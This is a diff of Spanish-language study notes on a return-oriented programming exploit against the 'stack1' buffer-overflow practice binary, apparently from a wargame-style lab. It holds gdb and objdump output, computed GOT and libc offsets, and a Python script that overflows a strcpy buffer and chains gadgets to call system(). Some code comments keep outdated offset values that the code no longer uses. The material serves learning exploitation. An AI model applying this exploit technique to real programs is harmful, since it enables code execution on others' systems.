@@ -198,37 +198,9 @@ Ref: ROP-libc.pdf
     GOT overwriting: Es similar a la anterior, pero aquí en vez de leer la dirección de una función y calcular la de otra, se sobreescribe la entrada GOT de una de ellas (p.e, strcpy) con la dirección tiene más el offset de la función a usar (p.e, system). Por último, se invoca a la PLT de la función sobreescrita haciendo un ret2plt.
 
 	
-	1.- GOT DEFERENCING
+1.- GOT DEFERENCING
 	
-	Ejemplo sencillo: stack1
-	
-	#include <stdlib.h>
-	#include <unistd.h>
-	#include <stdio.h>
-	#include <string.h>
-
-	int main(int argc, char **argv)
-	{
-	  volatile int modified;
-	  char buffer[64];
-
-	  if(argc == 1) {
-	      errx(1, "please specify an argument\n");
-	  }
-
-	  modified = 0;
-	  strcpy(buffer, argv[1]);
-
-	  if(modified == 0x61626364) {
-	      printf("you have correctly got the variable to the right value\n");
-	  } else {
-	      printf("Try again, you got 0x%08x\n", modified);
-	  }
-	}
-
-	
-	
-- Primero hago el sencillo, stack1:
+- Primero hago el ejemplo sencillo "stack1":
 
 #include <stdlib.h>
 #include <unistd.h>
@@ -267,7 +239,7 @@ objdump -t ./stack1 | grep GLIBC
 00000000       F *UND*	00000000              errx@@GLIBC_2.0
 00000000       F *UND*	00000000              puts@@GLIBC_2.0
 
-Las llamadas a la función en el código ensamblador, en .plt y en la función main:
+Aquí se muestran las llamadas a la función en el código ensamblador, en .plt y en la función main:
 
 objdump -M intel -drw ./stack1 | grep strcpy -b3
 
@@ -283,8 +255,13 @@ objdump -M intel -drw ./stack1 | grep strcpy -b3
 
 - Valores que debemos calcular para preparar el exploit:
 
-a) Saber el valor de strcpy en GOT, como vemos más arriba de PLT se llama a la función en GOT haciendo un "jmp DWORD PTR ds:0x8049710":
-    strcpy@GOT: 0x08049710
+a) Saber el valor de "strcpy" en GOT, como vemos más arriba de PLT se llama a la función en GOT haciendo un "jmp DWORD PTR ds:0x8049710":
+    	PLT:
+	   0x8048368 <strcpy@plt>:	jmp    DWORD PTR ds:0x8049710 <-- Salto a la posición de strcpy en la GOT
+	GOT:
+	0x8049700:	0xb7fff918	0xb7feff40	0x0804834e	0xb7e10180
+	0x8049710 <strcpy@got.plt>:	0xb7e7f2f0	0xb7e41930	0x0804838e	0x0804839e
+   
 b) Hallar el valor del offset, para ello podemos hacerlo de dos maneras:
    - Mediante objdump:
 	objdump -T /lib/i386-linux-gnu/libc.so.6 | egrep 'strcpy$|system$'
@@ -295,58 +272,39 @@ b) Hallar el valor del offset, para ello podemos hacerlo de dos maneras:
 		
    - Directamente en gdb:
    	gdb-peda$ p system
-	$3 = {<text variable, no debug info>} 0xb7e46b30 <__libc_system>
+	$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
 	gdb-peda$ p strcpy
-	$4 = {<text gnu-indirect-function variable, no debug info>} 0xb7e81580 <strcpy>
-	gdb-peda$ p/x 0xb7e46b30-0xb7e81580
+	$2 = {<text gnu-indirect-function variable, no debug info>} 0xb7e6d580 <strcpy>
+	gdb-peda$ p/x 0xb7e32b30-0xb7e6d580
 	$5 = 0xfffc55b0
    
-   Estos métodos anteriores no dan el valor del offset tal como pone en el blog, me daba error con estos valores. Al investigar un poco, he tenido que mirar el valor
+Estos métodos anteriores no dan el valor del offset tal como pone en el blog, me daba error con estos valores. Al investigar un poco, he visto que el valor del "strcpy" no corresponde a 0xb7e6d580 ó 0x00075580, sino que se corresponde con el contenido que hay en la dirección [0x8049710] = 0xb7e7f2f0. De esta manera recalculando el offset tenemos: 0xb7e32b30(system) -  0xb7e7f2f0(strcpy) = 0xfffb3840
   
-c) Hallar posición de memoria donde podamos guardar el offset calculado anteriormente:	
-   data: 0x08049720
+c) Hallar posición de memoria donde podamos guardar el offset calculado anteriormente, para eso necesitamos un lugar estático con permisos de escritura:
 
-- El proceso de construcción del exploit sería el siguiente:
-
-a) Encontramos una dirección de memoria donde podamos guardar el offset.
-
-0xb7feff40 <_dl_runtime_resolve>:	push   eax
-
-
-Tenemos la GOT en 
-
-0x8049700:	0xb7fff918	0xb7feff40	0x0804834e	0xb7e24180
-0x8049710 <strcpy@got.plt>:	0x0804836e	0x0804837e	0x0804838e	0x0804839e
-
-Tenemos PLT en:
-
-   0x8048368 <strcpy@plt>:	jmp    DWORD PTR ds:0x8049710
-=> 0x804836e <strcpy@plt+6>:	push   0x10
-   0x8048373 <strcpy@plt+11>:	jmp    0x8048338
-
-
-objdump -T /lib/i386-linux-gnu/libc.so.6 | egrep 'strcpy$|system$'
-00075580 g   iD  .text	00000042  GLIBC_2.0   strcpy
-0003ab30 g    DF .text	00000037  GLIBC_PRIVATE __libc_system
-0003ab30  w   DF .text	00000037  GLIBC_2.0   system
-
-
-0x0003ab30-0x00075580= 0xFFFC55B0 (offset)
-
-gdb-peda$ p system
-$3 = {<text variable, no debug info>} 0xb7e46b30 <__libc_system>
-gdb-peda$ p strcpy
-$4 = {<text gnu-indirect-function variable, no debug info>} 0xb7e81580 <strcpy>
-gdb-peda$ p/x 0xb7e46b30-0xb7e81580
-$5 = 0xfffc55b0
-
-readelf -S stack1 | grep "\.data"
+  readelf -S stack1 | grep "\.data"
   [24] .data             PROGBITS        08049720 000720 000008 00  WA  0   0  4
 
+-Recopilando, ya tenemos los 3 valores para armar el exploit:
+
+    strcpy@GOT: 0x8049710
+    Offset system-strcpy: 0xfffb3840
+    data: 0x08049720
+
+- Los pasos a seguir para construir el exploit serán los siguientes:
+
+1) Para guardar el offset en una posicion de memoria que tenga permisos de escritura necesitaremos:
+	- Instrucción de ensamblador que nos guarde en un registro el valor donde vamos a guardar en memoria el offset (pop $reg)
+	- Meter en esa posición de memoria el valor del offset (del tipo stor [reg] o add [reg])
+	
+2) Hay que poner la direccion de strcpy en un registro, para luego sumarle el offset y llegar a system
 
 
 
-Este sería mi script, que no funciona:
+
+
+Este sería mi script final:
+
 
 #!/usr/bin/python
 
@@ -354,7 +312,7 @@ Este sería mi script, que no funciona:
 from struct import pack
 
 
-junk = "A" * 80  # 80 bytes
+junk = "A" * 64 + "dcba" + "A" * 12  # 80 bytes
 
 ## ROP gadgets ##
 
@@ -369,7 +327,7 @@ gadget5 = pack('<I', 0x804845f) # (5) call eax ; leave ;;
 
 
 padding = 0xcafedeef
-offset = 0xfffc55b0 - 0x8			# 0xfffc55a8
+offset = 0xfffb3840 - 0x8			# El offset hay que calcularlo en gdb, no funciona lo anterior
 data = (0x08049720-0x5d5b04c4) & 0xFFFFFFFF 	# 0xaaa9925c
 strcpy_got = (0x08049710+0xb8a0008)            	# 0x138E9718 strcpy@GOT + 0xb8a0008 for the gadget (4)
 gnu_string = 0x8048154                          # "GNU\x00" from note.gnu.build-id
@@ -378,7 +336,7 @@ gnu_string = 0x8048154                          # "GNU\x00" from note.gnu.build-
 
 # Primero tenemos que encontra una manera de guardar el offset en una posicion de memoria que tenga permisos de escritura
 
-rop = gadget1                   # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
+rop = gadget1              	# (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
 rop += pack('<I', data)		# direccion donde se puede guardar datos readelf -S stack1 | grep "\.data" (0x08049720) --> pop ebx | A esta direccion 0x08049720 hay que restarle el valor de 0x5d5b04c4, ya que luego vamos a usar la instruccion "add [ebx+0x5d5b04c4] eax" en el gadget2. Valor=(0x08049720-0x5d5b04c4) & 0xFFFFFFFF = 0xaaa9925c
 rop += pack('<I', padding)	# otro valor cualquiera --> pop esi
 rop += pack('<I', offset)	# valor del offset (&system-&strcpy)(0xfffc55b0) --> pop edi | A este valor hay que restarle 0x8 condicionado por la instruccion "add al 0x8" del gadget2. Valor = 0xfffc55b0 - 0x8 = 0xfffc55a8
@@ -389,11 +347,11 @@ rop += gadget2			# (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
 
 rop += gadget3                 	# (3) pop ebx ; pop ebp ;;
 rop += pack('<I', strcpy_got)   # direccion de strcpy (0xb7e81580) | Hay que sumarle 0xb8a0008 condicionado por la instruccion "add eax [ebx-0xb8a0008]" del gadget4. Valor= 0xb7e81580 + 0xb8a0008 = 0xC3721588
-rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
+rop += pack('<I', padding)		# otro valor cualquiera --> pop ebp
 rop += gadget4                  # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; EAX = (OFFSET system-strcpy) + strcpy = SYSTEM ;D
-rop += pack('<I', padding)	# otro valor cualquiera --> add esp 0x4
-rop += pack('<I', padding)	# otro valor cualquiera --> pop ebx
-rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
+rop += pack('<I', padding)		# otro valor cualquiera --> add esp 0x4
+rop += pack('<I', padding)		# otro valor cualquiera --> pop ebx
+rop += pack('<I', padding)		# otro valor cualquiera --> pop ebp
 
 
 # Por ultimo llamamos a system
@@ -405,6 +363,7 @@ rop += pack('<I', gnu_string)    # "GNU" string
 payload = junk + rop
  
 print payload
+
 
 
 
